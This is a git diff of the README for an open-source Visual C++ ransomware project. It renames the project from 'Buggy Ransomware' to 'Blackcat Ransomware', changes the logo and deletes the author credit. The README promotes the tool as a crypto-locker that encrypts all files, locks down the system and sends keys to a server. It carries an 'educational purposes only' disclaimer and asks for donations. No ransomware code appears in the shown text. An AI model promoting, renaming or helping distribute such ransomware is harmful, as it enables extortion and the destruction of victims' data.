@@ -1,10 +1,10 @@
 #### DISCLAIMER : OUR TOOLS ARE FOR EDUCATIONAL PURPOSES ONLY. DON'T USE THEM FOR ILLEGAL ACTIVITIES. YOU ARE THE ONLY RESPONSABLE FOR YOUR ACTIONS! OUR TOOLS ARE OPEN SOURCE WITH NO WARRANTY AND AS ARE.
 
-<img src="logor.png" alt="logo">
+<img src="logon.png" alt="logo">
 
-# Buggy Ransomware
+# Blackcat Ransomware
 
-Buggy Ransomware is open source  Crypto-Locker. Buggy Ransomware is developed in Visual C++. It has features encrypt all file, lock down the system and send keys back to the server. Multi-threaded functionality helps to this tool make encryption faster.
+Blackcat Ransomware is open source Crypto-Locker. Blackcat Ransomware is developed in Visual C++. It has features encrypt all file, lock down the system and send keys back to the server. Multi-threaded functionality helps to this tool make encryption faster.
 
 ## Features
 
@@ -64,10 +64,6 @@ out_file.open("data.txt", ios::in);
 ```
 
 # Currently in Development....Happy Hacking:)
-
-## Authors
-
-Ajay Randhawa
 
 ## Donate
 If you appreciate that, please consider donating to the Developer.
